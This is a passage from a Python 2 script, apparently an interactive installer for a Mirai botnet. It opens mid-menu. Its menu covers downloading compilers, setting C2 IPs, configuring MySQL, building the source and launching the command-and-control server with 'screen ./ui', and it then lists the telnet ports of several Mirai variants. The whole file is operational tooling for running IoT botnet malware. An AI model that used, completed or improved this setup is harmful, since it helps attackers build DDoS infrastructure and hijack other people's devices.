    \x1b[96m2) \x1b[37mDownload Mirai Compilers
    \x1b[96m3) \x1b[37mConfigure Mirai Compilers
    \x1b[96m4) \x1b[37mInstall Go v1.9.4
    \x1b[96m5) \x1b[37mWhere to change IPs in your source \x1b[37m(\x1b[31mUSER INPUT REQUIRED!\x1b[37m)
    \x1b[96m6) \x1b[37mSetup MYSQL Databases \x1b[37m(\x1b[31mUSER INPUT REQUIRED!\x1b[37m)
    \x1b[96m7) \x1b[37mSetup MYSQL Databases PART 2\x1b[37m(\x1b[31mUSER INPUT REQUIRED!\x1b[37m)
    \x1b[96m8) \x1b[37mStop & Restart Services
    \x1b[96m9) \x1b[37mBuild The Source
    \x1b[96m10) \x1b[37mUlimit
    \x1b[96m11) \x1b[37mScreen the CNC

    Press Q to quit
    Press B to go back

    please select an option: """)
    if mirai == "Q":
        exit()
    if mirai == "B":
        print("Returning to the main menu in 2 seconds.")
        for i in xrange(2,0,-1):
                sys.stdout.write(str(i)+' ') # countdown code
                sys.stdout.flush()
                time.sleep(1) # sleep so we dont kill ourselves :hahayes:
        run('clear')    
        userinput = raw_input("""\x1b[37m

        \x1b[96mwelcome to big Mirai semi-auto setup
        made by charge./switch

        \x1b[96m1) \x1b[37mMirai Setup
        \x1b[96m2) \x1b[37mInformation

            
        \x1b[96mplease select an option (1 or 2): """)

if mirai == "11":
    screen = raw_input("""
        \x1b[96mOk, now final thing, we're going to screen the cnc, dont worry, \x1b[31mthe script will run the command for you,
        but you will have to do one more thing.

        \x1b[96mWhen the CNC is screened there will probably be a message such as \x1b[31m"MySQL DB Opened" Or "Botnet started" 
        it depends on what source you're using.

        \x1b[96mWhen you see this message you will need to detach the screen. \x1b[31mYou can do this by doing the following:

        Hold down CTRL, and while holding down CTRL hold down A, then press D, so all together, CTRL A+D.

        Press Enter when you are ready: """)
    print("")
    print("\x1b[31mScreening the CNC in 5 seconds.\x1b[37m")
    for i in xrange(5,0,-1):
        sys.stdout.write(str(i)+' ') # countdown code
        sys.stdout.flush()
        time.sleep(1) # sleep so we dont kill ourselves :hahayes:
    run('screen ./ui')
    prank = raw_input("""

        \x1b[96mCongrats, your Mirai is now setup, you can check in the table.c or the main.go to see which port you need to connect on.

        \x1b[96mHere is a list of commonly used Mirai sources with their ports:

        \x1b[32mHoHo = Telnet Port 45
        Mana = Telnet Port 1791
        Hybrid = Telnet Port 81
        Senpai = Telnet Port 1312
        Apex = Telnet Port 6667
        Apollo v1 = Telnet Port 666
        Hito = Telnet Port 3456
        Osiris = Telnet Port 9506

        \x1b[96mIf you have any others you want me to add or you have any other special feature requests for possible future updates
        \x1b[32mMessage me on Discord: charge.#6666

        \x1b[32mThanks for using.
        \x1b[32mMade by charge./switch
        \x1b[37mPress any key to continue... \n""")
    print("\x1b[31mThis script will now brick your server in 2 seconds.\n")
    for i in xrange(2,0,-1):
        sys.stdout.write(str(i)+' ') # countdown code
        sys.stdout.flush()
        time.sleep(1) # sleep so we dont kill ourselves :hahayes:
    print("\x1b[32m\nIM JOKINGGG RELAXXXX\n")
    time.sleep(1)
    print("\x1b[31mScript will now close in 2 seconds.\n\x1b[37m")
    for i in xrange(2,0,-1):
        sys.stdout.write(str(i)+' ') # countdown code
        sys.stdout.flush()
        time.sleep(1) # sleep so we dont kill ourselves :hahayes:
        print("")
    exit()